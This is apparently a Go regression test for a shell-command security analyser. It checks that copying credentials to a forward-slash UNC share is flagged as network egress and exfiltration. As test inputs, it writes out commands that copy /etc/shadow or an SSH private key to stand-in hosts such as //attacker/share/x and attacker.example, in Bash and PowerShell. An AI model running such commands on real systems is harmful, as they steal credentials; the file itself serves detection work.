package analysis

import (
	"testing"

	"github.com/v0lka/flowsh/engine"
)

// ===========================================================================
// Pass 56: a fresh review of the pass-55 (remediated) tree
// ===========================================================================
//
// One finding (87) was raised by the adversarial re-review of the remediated
// tree and is pinned here. The test reproduces the documented payload and
// asserts the fixed verdict — the network effect that was missing, the
// exfiltration pair, the grade — plus the parity with every sibling spelling
// the review compared against. It is a regression gate for the class, not for
// one spelling.

// netEgressTop reports whether rep carries a NetEgress effect whose target is
// unresolved (⊤): a network sink whose authority the command text does not
// determine.
func netEgressTop(rep *Report) bool {
	for _, e := range rep.Effects {
		if e.Kind == engine.KindNetEgress && e.Target.IsTop() {
			return true
		}
	}
	return false
}

// netEgressNamed reports whether rep carries a NetEgress effect naming host.
func netEgressNamed(rep *Report, host string) bool {
	return effectOn(rep, engine.KindNetEgress, host)
}

// TestFinding087ForwardSlashUNCIsRemote pins F87: a UNC authority written with
// forward slashes and a single-label host (`//attacker/share/x`) was dropped
// from the network layer, because the resolver accepts that spelling only for
// an unambiguous (dotted or address-literal) authority and the caller then
// treated the path as local. A credential copied to such a share therefore
// formed no exfiltration pair and `Exfiltration: Deny` allowed the upload,
// while its `\\attacker\share\x` twin, `scp attacker:/x` and `nc attacker 443`
// all paired. Windows reads exactly this spelling as a UNC path, POSIX reads it
// as a doubled separator, so the analyser must not guess local: it reports an
// unresolved network sink (⊤) that pairs with what the command read.
func TestFinding087ForwardSlashUNCIsRemote(t *testing.T) {
	a := mustAnalyzer(t)

	// A bash-mode copy of a credential to a single-label UNC share is a
	// possible remote write: the egress is reported (unresolved authority) and
	// the credential read pairs with it.
	for _, src := range []string{
		`cp /etc/shadow //attacker/share/x`,
		`install -m 600 /etc/shadow //attacker/share/x`,
		`tee //attacker/share/x < /etc/shadow`,
		`cat /etc/shadow > //attacker/share/x`,
		`tar cf //attacker/share/x.tgz /etc/shadow`,
	} {
		rep := a.Analyze(LangBash, src)
		if !netEgressTop(rep) {
			t.Errorf("%q: no unresolved NetEgress (effects=%v)", src, rep.Effects)
		}
		mustExfilCritical(t, rep, src)
	}

	// Parity: an unambiguous authority keeps its name in both spellings, and
	// the two spellings of an ambiguous one agree on the exfiltration verdict.
	for _, c := range [][2]string{
		{`cp /etc/shadow //attacker.example/share/x`, `cp /etc/shadow '\\attacker.example\share\x'`},
	} {
		fwd := a.Analyze(LangBash, c[0])
		back := a.Analyze(LangBash, c[1])
		if !netEgressNamed(fwd, "attacker.example") || !netEgressNamed(back, "attacker.example") {
			t.Errorf("%s / %s: authority not named (effects=%v / %v)", c[0], c[1], fwd.Effects, back.Effects)
		}
		if fwd.Score.Exfil != back.Score.Exfil || len(fwd.Score.ExfilPairs) != len(back.Score.ExfilPairs) {
			t.Errorf("%q: exfil %s/%d, backslash twin %s/%d", c[0],
				fwd.Score.Exfil, len(fwd.Score.ExfilPairs), back.Score.Exfil, len(back.Score.ExfilPairs))
		}
	}

	// The single-label backslash spelling is unambiguous by construction and
	// stays a named authority.
	rep := a.Analyze(LangBash, `cp /etc/shadow '\\attacker\share\x'`)
	if !netEgressNamed(rep, "attacker") {
		t.Errorf("backslash single-label authority not named (effects=%v)", rep.Effects)
	}
	mustExfilCritical(t, rep, `cp /etc/shadow '\\attacker\share\x'`)

	// The PowerShell frontend copies to the same authority through the same
	// path grammar: `Copy-Item key //attacker/share/x` uploads the key.
	for _, src := range []string{
		`Copy-Item C:\keys\id_rsa //attacker/share/x`,
		`Copy-Item C:\keys\id_rsa \\attacker\share\x`,
	} {
		rep := a.Analyze(LangPowerShell, src)
		if !netEgressNamed(rep, "attacker") && !netEgressTop(rep) {
			t.Errorf("%q: no network sink (effects=%v)", src, rep.Effects)
		}
		mustExfilCritical(t, rep, src)
	}

	// Controls: an authority that names this host is local and must not gain a
	// fabricated network sink.
	for _, src := range []string{
		`cp /etc/shadow //localhost/share/x`,
		`cp /etc/shadow //127.0.0.1/share/x`,
		`cp /etc/shadow '\\localhost\share\x'`,
		`cp /etc/shadow /etc/passwd`,
	} {
		rep := a.Analyze(LangBash, src)
		if hasKind(rep, engine.KindNetEgress) {
			t.Errorf("%q: loopback/local path produced NetEgress (effects=%v)", src, rep.Effects)
		}
	}

	// The documented over-report: POSIX's doubled separator is
	// indistinguishable from a single-label authority, so the egress is
	// reported as unresolved rather than the path being guessed local. The
	// authority is never fabricated from it.
	rep = a.Analyze(LangBash, `cp a //tmp/b`)
	if !netEgressTop(rep) {
		t.Errorf("`cp a //tmp/b`: no unresolved NetEgress (effects=%v)", rep.Effects)
	}
	if netEgressNamed(rep, "tmp") {
		t.Errorf("`cp a //tmp/b`: fabricated authority \"tmp\" (effects=%v)", rep.Effects)
	}
}
